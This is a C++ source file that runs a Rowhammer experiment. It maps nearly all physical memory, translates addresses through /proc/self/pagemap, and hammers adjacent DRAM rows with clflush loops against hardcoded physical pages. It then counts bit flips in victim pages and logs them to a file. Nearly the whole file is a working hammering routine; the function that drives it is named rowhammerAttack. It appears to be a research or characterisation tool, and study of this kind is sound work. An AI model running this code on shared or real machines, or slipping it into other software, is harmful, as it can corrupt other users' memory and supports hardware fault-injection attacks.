#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <sys/sysinfo.h>
#include <chrono>
#include <sys/personality.h>
#include <sched.h>
#include <inttypes.h>
#include <bits/stdc++.h>



#define NUMBER_PAGES 3
#define PAGE_SIZE 4096
#define TOGGLES 3000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define TIME_BETWEEN_ITERATIONS 300000
#define MAX_POSITION 9
#define OFFSET 0x9b0
#define E_SIZE 8 * 640

using namespace std;


size_t mem_size;
char *memory;
double fraction_of_physical_memory = 1.0;
bool zero_to_one_flips = true;

struct PageCandidate {
    uint32_t pageNumber;
    uint32_t abovePage;
    uint32_t belowPage;

    uint8_t* pageVA;
    uint8_t* aboveVA[2];
    uint8_t* belowVA[2];
};




uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}


uint64_t get_same_row_mapping(void* virt_addr) {
    uint64_t phys_addr = getPage((uint8_t *) virt_addr);
    uint64_t value = reinterpret_cast<uintptr_t>(phys_addr) >> (17 - 12);
    return value;
}

void printPageRowMatchers(uint8_t* addr, int length) {
    printf("Page starting at %p\n", addr);
    int numberPages = ceil(length / 4096);
    for(int i = 0; i < numberPages; i++) {
        uint64_t rowMapping = get_same_row_mapping((void *) addr);
        printf("Page %i: %lx", i, rowMapping);
    }
    printf("\n");
}


bool pagesFilled(PageCandidate p) {
    if(p.pageVA != 0 && p.aboveVA[0] != 0 && p.aboveVA[1] != 0 && p.belowVA[0] != 0 && p.belowVA[1] != 0) {
        return true;
    } else {
        return false;
    }
}

void printPage(PageCandidate p) {
    uint16_t* data = reinterpret_cast<uint16_t *>(p.pageVA);
    uint16_t* aboveData = reinterpret_cast<uint16_t *>(p.aboveVA[0]);
    uint16_t* belowData = reinterpret_cast<uint16_t *>(p.belowVA[0]);

    for(int off = 0; off < 512 * 4; off++) {
        printf("Address: %p\t", (data + off));
        printf("%i\t", *(data + off));
        if(off % 8 == 7) {
            printf("\n");
        }
    }
    printf("\n");
}

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("cpuid" ::: "rax","rbx","rcx","rdx");
  asm volatile ("rdtscp" : "=a" (a), "=d" (d) : : "rcx");
  a = (d<<32) | a;
  return a;
}

uint64_t rdtsc2() {
  uint64_t a, d;
  asm volatile ("rdtscp" : "=a" (a), "=d" (d) : : "rcx");
  asm volatile ("cpuid" ::: "rax","rbx","rcx","rdx");
  a = (d<<32) | a;
  return a;
}

void *GetBlockByOrder(int order){
    size_t s=PAGE_SIZE*pow(2, order);
    mem_size = s;
    void *ptr = mmap(NULL, s, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(ptr!= (void*)-1);

    for (uint64_t index = 0; index < s; index += 0x1000) {
        uint64_t* temporary = reinterpret_cast<uint64_t*>(static_cast<uint8_t*>(ptr) + index);
        temporary[0] = index+1;
    }
    return ptr;
}


uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));

    printf("MemorySize: %zx\n", mem_size);  


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(memory != MAP_FAILED);

    for(size_t i = 0; i < mem_size; i++) {
	    memory[i] = 77 + i;
    }
}

void formOuterPages(PageCandidate page) {
    string line;
    string fileName = "suppression_data/";
    ifstream myfile(fileName.append(to_string(page.pageNumber)).append(".txt"));


    if(myfile.is_open()) {
        while(getline(myfile,line)) {
            int pos = line.find(",");
            
            int index = stoi(line.substr(0, pos));
            int bit = stoi(line.substr(pos + 1));

            printf("line: %s\n", line.c_str());
            printf("index: %i\n", index);
            printf("bit: %i\n", bit);
            printf("\n");

            uint16_t* aboveAddress[2];
            uint16_t* belowAddress[2];

            aboveAddress[0] = reinterpret_cast<uint16_t*>(page.aboveVA[0] + index * 2);
            aboveAddress[1] = reinterpret_cast<uint16_t*>(page.aboveVA[1] + index * 2);
            
            belowAddress[0] = reinterpret_cast<uint16_t*>(page.belowVA[0] + index * 2);
            belowAddress[1] = reinterpret_cast<uint16_t*>(page.belowVA[1] + index * 2);

            uint16_t mask = 0x1 << bit;
            *aboveAddress[0] |= mask;
            *aboveAddress[1] |= mask;
            *belowAddress[0] |= mask;
            *belowAddress[1] |= mask;
        }
        myfile.close();
    }
    else cout << "Unable to open file"; 
}


void fillMemory(PageCandidate page) {
    uint8_t lowerBits = 0x00;
    uint8_t upperBits = 0x01;
    uint8_t victimFill = 0x00;
    if(!zero_to_one_flips) {
        lowerBits = 0x00;
        upperBits = 0x00;
        victimFill = 0xFF;
    }

    memset((void *) page.pageVA, victimFill, PAGE_SIZE);

    for(int i = 0; i < PAGE_SIZE; i++) {
        if(i % 2 == 0) {
            memset((void *) (page.aboveVA[0] + i), lowerBits, 1);
            memset((void *) (page.aboveVA[1] + i), lowerBits, 1);
            memset((void *) (page.belowVA[0] + i), lowerBits, 1);
            memset((void *) (page.belowVA[1] + i), lowerBits, 1);
        } else {
            memset((void *) (page.aboveVA[0] + i), upperBits, 1);
            memset((void *) (page.aboveVA[1] + i), upperBits, 1);
            memset((void *) (page.belowVA[0] + i), upperBits, 1);
            memset((void *) (page.belowVA[1] + i), upperBits, 1);
        }
    }

    formOuterPages(page);
}





void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations) {
    for(int i = 0; i < iterations; i++) {
        volatile uint64_t *f = (volatile uint64_t *)aboveVA;
        volatile uint64_t *s = (volatile uint64_t *)belowVA;
        unsigned long iters = TOGGLES;

        for(; iters --> 0;) {
            asm volatile("clflush (%0)" : : "r" (f) : "memory");
            *f;
            asm volatile("clflush (%0)" : : "r" (s) : "memory");
            *s;
        }
    }
}










void addVAstoPages(vector<PageCandidate> &pages) {
    printf("Searching for page VAs...\n");
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }

            if(p.abovePage == moverPA) {
                p.aboveVA[0] = moverVA;
	        	match = true;
            }
            if(p.belowPage == moverPA) {
                p.belowVA[0] = moverVA;
	        	match = true;
            }

            if(p.abovePage + 1 == moverPA) {
                p.aboveVA[1] = moverVA;
	        	match = true;
            }
            if(p.belowPage + 1 == moverPA) {
                p.belowVA[1] = moverVA;
	        	match = true;
            }

            pages[i] = p;
        }
	if(!match) {
	}

        moverVA += 0x1000;
    }
    printf("Done searching...\n\n");
}

void countFlips(PageCandidate page, int flips[NUMBER_PAGES][16], int row256FlipLocations[NUMBER_PAGES][8], int pageNumber) {
    ofstream suprfile;
    string fileName = "suppression_data/";
    
    uint16_t* mover = (uint16_t*) page.pageVA;
    for(int halfword = 0; halfword < PAGE_SIZE / 2; halfword++) {
        uint16_t* pos = mover + halfword;

        for(int bit = 0; bit < 16; bit++) {
            uint16_t mask = 0x1 << bit;
            int value = (int) (*pos & mask);

            if(value > 0 && zero_to_one_flips || value <= 0 && !zero_to_one_flips) {
                flips[pageNumber][bit]++;

                printf("Found %i flip: %i\n", bit, halfword);


                if(bit == 8) {
                    int column = halfword % 8;
                    row256FlipLocations[pageNumber][column]++;

                    printf("Found 256 flip: %i\n", halfword);
                }
            }

        }
    }
}



void outputFile(vector<PageCandidate> pages) {
    printf("Pages VA: %p\n", pages[0].pageVA);

    FILE * pFile;
    pFile = fopen("data.txt","w");    

    uint16_t* mover = reinterpret_cast<uint16_t*>(pages[0].pageVA + OFFSET);
    int pageCount = 0;
    for(int i = 0; i < E_SIZE; i++) {
        if(pageCount == 0) {
            fprintf(pFile, "0\t");

            if(i % 8 == 7)
                fprintf(pFile, "\n");
        }

        if(pageCount != 0) {
            fprintf(pFile, "%i\t", *mover);
            
            if(i % 8 == 7)
                fprintf(pFile, "\n");
        }

        mover++;

        int nextPage = (int) ((uintptr_t) mover) & 0xFFF;
        if(nextPage == 0) {
            pageCount++;
            mover = (uint16_t*) pages[pageCount].pageVA;
        }


    }

    fclose(pFile);
}

void outputFileModified(vector<PageCandidate> pages) {
    printf("Pages VA: %p\n", pages[0].pageVA);

    int initialStartingPosition = (0x1000 - OFFSET) / 2;
    printf("ISP: %i\n", initialStartingPosition);

    FILE * pFile;
    pFile = fopen("data.txt","w");    

    uint16_t* mover = reinterpret_cast<uint16_t*>(pages[0].pageVA);
    int pageCount = 0;
    for(int i = 0; i < E_SIZE; i++) {
        if(i < initialStartingPosition) {
            fprintf(pFile, "0\t");

            if(i % 8 == 7)
                fprintf(pFile, "\n");
        }
        else {
            fprintf(pFile, "%i\t", *mover);
            
            if(i % 8 == 7)
                fprintf(pFile, "\n");

            mover++;

            int nextPage = (int) ((uintptr_t) mover) & 0xFFF;
            if(nextPage == 0) {
                pageCount++;
                if(pageCount >= NUMBER_PAGES) {
                    printf("Pages went over, ERROR\n");
                }

                mover = (uint16_t*) pages[pageCount].pageVA;
            }
        }
    }

    fclose(pFile);
}


void checkFlipsOtherPages(vector<PageCandidate> &pages) {
    printf("Searching for page VAs...\n");
    uint8_t* moverVA = (uint8_t*) memory;
    bool skip = false;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
        for(int i = 0; i < NUMBER_PAGES; i++) {
            uintptr_t above0 = getPage(pages[i].aboveVA[0]);
            uintptr_t above1 = getPage(pages[i].aboveVA[1]);
            uintptr_t below0 = getPage(pages[i].belowVA[0]);
            uintptr_t below1 = getPage(pages[i].belowVA[1]);
            if(above0 == moverPA || above1 == moverPA || below0 == moverPA || below1 == moverPA) {
                skip = true;
            }
        }

        if(*moverVA != 0 && !skip) {
            printf("Address %p: %x\n", moverPA, *moverVA);
        }

        moverVA += 0x1;
        skip = false;
    }
    printf("Done searching...\n\n");
}

void rowhammerAttack(vector<PageCandidate> &pages) {
    for(int i = 0; i < NUMBER_PAGES; i++) {
        printf("Above VA1: %p\n", pages[i].aboveVA[0]);
        printf("Above VA2: %p\n", pages[i].aboveVA[1]);
        printf("Target VA: %p\n", pages[i].pageVA);
        printf("Below VA1: %p\n", pages[i].belowVA[0]);
        printf("Below VA2: %p\n", pages[i].belowVA[1]);
        printf("\n");
    }


    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p = pages[i];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
        }
    }
    printf("All pages found...\n");


    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p = pages[i];
        fillMemory(p);
    }


    sleep(5);

    int row256FlipLocations[NUMBER_PAGES][8] = {};
    int bitFlipLocations[NUMBER_PAGES][16] = {};

    int totalRow256FlipLocations[8] = {};
    int totalBitFlipLocations[16] = {};
    for(int i = 0; i < TEST_ITERATIONS; i++) {
        for(int p = 0; p < NUMBER_PAGES; p++) {
            sleep(5);

            PageCandidate page = pages[p];

            auto start = chrono::steady_clock::now();
            rowhammer(page.aboveVA[0], page.belowVA[0], 1);
            auto end = chrono::steady_clock::now();
            chrono::duration<double> elapsed_seconds = end-start;
            printf("Elapsed time for hammer: %f\n", elapsed_seconds.count());

            countFlips(page, bitFlipLocations, row256FlipLocations, p);

            printf("Page number: 0x%x\n", page.pageNumber);
            printf("Flips in columns:\t");
            for(int t = 0; t < 8; t++) {
                totalRow256FlipLocations[t] += row256FlipLocations[p][t];
                printf("%i: %i\t", t, row256FlipLocations[p][t]);
                row256FlipLocations[p][t] = 0;
            }
            printf("\n");
            printf("Flips in positions:\t");
            for(int t = 0; t < 16; t++) {
                totalBitFlipLocations[t] += bitFlipLocations[p][t];
                printf("%i: %i\t", t, bitFlipLocations[p][t]);
                bitFlipLocations[p][t] = 0;
            }
            printf("\n");
            printf("\n");
            

            if(i != TEST_ITERATIONS - 1)
                if(zero_to_one_flips)
                    memset((void *) page.pageVA, 0x00, PAGE_SIZE);
                else
                    memset((void *) page.pageVA, 0xFF, PAGE_SIZE);

        }
    }

    printf("\n");
    printf("Total Bit Flip Information:\n");
    printf("Total flips in positions:\t");
    for(int f = 0; f < 16; f++) {
        printf("%i: %i\t", f, totalBitFlipLocations[f]);
    }
    printf("\n");
    printf("Total flips in columns:\t\t");
    for(int f = 0; f < 8; f++) {
        printf("%i: %i\t", f, totalRow256FlipLocations[f]);
    }
    printf("\n");



    outputFileModified(pages);

	printf("Done hammering\n");
	return;
}






int main(int argc, char *argv[]) {
    uintptr_t attackPages[NUMBER_PAGES] = {0xc2c4d, 0x45a9f, 0x2215c};
    uintptr_t abovePages[NUMBER_PAGES] = {0xc2c0f, 0x45a58, 0x2211e};
    uintptr_t belowPages[NUMBER_PAGES] = {0xc2c8a, 0x45adc, 0x2219a};

    zero_to_one_flips = true;

    setupMapping();
    printf("Finished setting up memory...\n");

    vector<PageCandidate> pages;
    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p;
        p.pageNumber = attackPages[i];
        p.abovePage = abovePages[i];
        p.belowPage = belowPages[i];

        p.pageVA = 0;
        p.aboveVA[0] = 0;
        p.aboveVA[1] = 0;
        p.belowVA[0] = 0;
        p.belowVA[1] = 0;
        pages.push_back(p);
    }

    addVAstoPages(pages);

    rowhammerAttack(pages);

    return 0;
}
